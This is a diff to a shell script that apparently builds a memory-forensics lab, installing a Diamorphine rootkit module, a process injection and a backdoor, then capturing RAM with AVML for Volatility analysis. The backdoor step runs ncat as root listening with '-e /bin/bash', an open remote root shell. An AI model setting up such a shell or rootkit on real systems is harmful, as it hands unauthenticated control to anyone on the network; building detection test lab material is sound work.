@@ -12,8 +12,11 @@ FLAG_ROOTKIT="/tmp/.rootkit_active"
 FLAG_INJECTION="/tmp/.injection_active"
 FLAG_BACKDOOR="/tmp/.backdoor_active"
 
-AVML_PATH="/tmp/avml"
+# AVML – prefer system binary, else download
+AVML_DOWNLOAD_DIR="$HOME/.local/bin"
+AVML_DOWNLOAD_PATH="$AVML_DOWNLOAD_DIR/avml"
 AVML_URL="https://github.com/microsoft/avml/releases/download/v0.14.0/avml"
+AVML_PATH=""   # will be set by ensure_avml
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 MODULE_PATH="$SCRIPT_DIR/assets/diamorphine.ko"
@@ -59,25 +62,6 @@ install_injection() {
         exit 1
     fi
 
-    # ------------------------------------------------------------------ #
-    # NEW INJECTION DETECTION STRATEGY: lsof marker                       #
-    #                                                                      #
-    # Problem: the old approach (detect "sleep 9999" in pslist, or find   #
-    # evil.so via linux.elfs/Maps) fails because:                         #
-    #   a) When the rootkit is also active, Diamorphine hides the sleep   #
-    #      process from /proc, so pslist misses it.                       #
-    #   b) After dlopen/LD_PRELOAD the library file may be mapped         #
-    #      anonymously, making library-list plugins blind to it.          #
-    #                                                                      #
-    # New approach: create a uniquely-named file and keep it open via a   #
-    # dedicated "tail -f" process. Volatility's linux.lsof.Lsof walks     #
-    #   task_struct → files → fdtable → file → dentry → d_name            #
-    # directly from kernel memory (not /proc), so it finds the open fd    #
-    # even if the process is hidden from /proc by the rootkit.            #
-    # AVML captures all kernel memory, so the dentry/inode for the open   #
-    # file survives the memory acquisition step.                           #
-    # ------------------------------------------------------------------ #
-
     # 1. Create the unique marker file with a recognisable magic string
     echo "INJECTION_MARKER_RAMble" > "$INJECTION_MARKER"
 
@@ -104,6 +88,10 @@ install_backdoor() {
         echo "[*] Backdoor already active."
         return 0
     fi
+
+    # Ensure no previous ncat is still bound
+    sudo pkill -f "ncat.*-l.*-p ${BACKDOOR_PORT}" 2>/dev/null || true
+
     sudo apt install -y ncat 2>/dev/null
     sudo ncat -l -k -p $BACKDOOR_PORT -e /bin/bash &
     touch "$FLAG_BACKDOOR"
@@ -153,7 +141,9 @@ clean_injection() {
 clean_backdoor() {
     local pid
     pid=$(pgrep -f "ncat.*-l.*-p ${BACKDOOR_PORT}" 2>/dev/null || true)
-    [ -n "$pid" ] && sudo kill "$pid" 2>/dev/null || true
+    if [ -n "$pid" ]; then
+        sudo kill -9 "$pid" 2>/dev/null || true
+    fi
     rm -f "$FLAG_BACKDOOR"
     echo "[+] Backdoor cleaned."
 }
@@ -173,11 +163,27 @@ active_components() {
 }
 
 ensure_avml() {
-    if [ -f "$AVML_PATH" ]; then return 0; fi
-    echo "[*] Downloading AVML..."
-    wget -q "$AVML_URL" -O "$AVML_PATH"
-    chmod +x "$AVML_PATH"
-    echo "[+] AVML ready at $AVML_PATH"
+    # 1. Check if avml is already installed via PATH
+    if command -v avml &>/dev/null; then
+        AVML_PATH="$(command -v avml)"
+        echo "[*] Using system-installed avml: $AVML_PATH"
+        return 0
+    fi
+
+    # 2. If a previously downloaded binary exists, use that
+    if [ -x "$AVML_DOWNLOAD_PATH" ]; then
+        AVML_PATH="$AVML_DOWNLOAD_PATH"
+        echo "[*] Using previously downloaded avml: $AVML_PATH"
+        return 0
+    fi
+
+    # 3. Download
+    echo "[*] Downloading avml to $AVML_DOWNLOAD_PATH ..."
+    mkdir -p "$AVML_DOWNLOAD_DIR"
+    wget -q "$AVML_URL" -O "$AVML_DOWNLOAD_PATH"
+    chmod +x "$AVML_DOWNLOAD_PATH"
+    AVML_PATH="$AVML_DOWNLOAD_PATH"
+    echo "[+] AVML installed at $AVML_PATH"
 }
 
 capture_memory() {
@@ -214,7 +220,9 @@ Examples:
   $0 -i rootkit -a /tmp/dumps
   $0 -i -a       (infect all, dump in current dir)
   $0 -c injection
-  $0 -c          (clean all)"
+  $0 -c          (clean all)
+Note: when using -i or -c with -a, put -a before the components list, e.g.:
+  $0 -i -a /path injection,backdoor"
 
 ACTION=""
 CAPTURE=false
@@ -227,7 +235,6 @@ while getopts "icsa" opt; do
         c) ACTION="clean";;
         s) ACTION="status";;
         a) CAPTURE=true
-           # If next argument exists and doesn't start with '-', use it as output dir
            if [ -n "${!OPTIND}" ] && [[ "${!OPTIND}" != -* ]]; then
                OUTPUT_DIR="${!OPTIND}"
                OPTIND=$((OPTIND+1))
